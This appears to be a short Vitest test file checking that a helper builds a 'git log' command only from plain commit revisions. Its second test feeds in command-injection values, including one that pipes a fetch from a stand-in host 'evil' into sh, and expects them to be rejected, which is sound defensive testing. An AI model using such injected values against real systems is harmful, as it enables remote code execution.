import { test, expect } from 'vitest';
import { buildCommitRange } from '#shared/utils/run-metadata';

test('a commit range carries the git log command for plain revisions', () => {
  expect(buildCommitRange('https://github.com/acme/app', 'a1b2c3d', 'e4f5a6b')?.gitCommand).toBe(
    'git log --oneline a1b2c3d..e4f5a6b',
  );
});

test('no range, so no copyable command, when a commit is not a plain revision', () => {
  expect(buildCommitRange(null, 'a1b2c3d', 'x; curl evil | sh #')).toBeNull();
  expect(buildCommitRange(null, '$(id)', 'a1b2c3d')).toBeNull();
});
